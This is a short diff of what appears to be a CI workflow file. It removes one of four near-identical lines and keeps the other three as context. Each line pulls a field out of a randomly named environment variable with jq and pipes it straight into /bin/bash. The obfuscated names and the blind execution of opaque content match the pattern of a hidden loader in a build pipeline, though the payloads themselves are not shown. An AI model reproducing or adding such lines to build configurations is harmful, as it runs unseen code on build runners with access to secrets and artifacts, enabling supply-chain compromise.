@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$kvnqs379" | jq -r .qtrdr65322 | /bin/bash
           echo $nqfy224 | jq -r .lki91 | /bin/bash
           echo $fkbae09421 | jq -r .dq7 | /bin/bash
-          printf '%s' "$vys74072" | jq -r .um93 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
